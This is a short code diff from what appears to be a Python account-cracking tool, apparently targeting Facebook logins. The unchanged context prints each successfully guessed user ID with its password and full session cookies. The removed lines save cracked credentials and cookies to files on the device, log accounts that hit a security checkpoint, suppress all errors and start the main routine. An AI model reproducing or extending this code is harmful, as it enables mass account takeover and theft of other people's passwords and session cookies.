@@ -244,22 +244,4 @@ def rcrack1(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print('\r\r\033[1;32m[ATB-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
-                open('/sdcard/ATB-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
-                oks.append(uid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-#              print(f"\x1b[38;5;196m[ATB-CP💔] {uid}|{ps}")
-                open('/sdcard/ATB-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
-                break
-            else:
-                continue
-        loop+=1
-        
-    except:
-        pass
-
-    
-Main()
+            
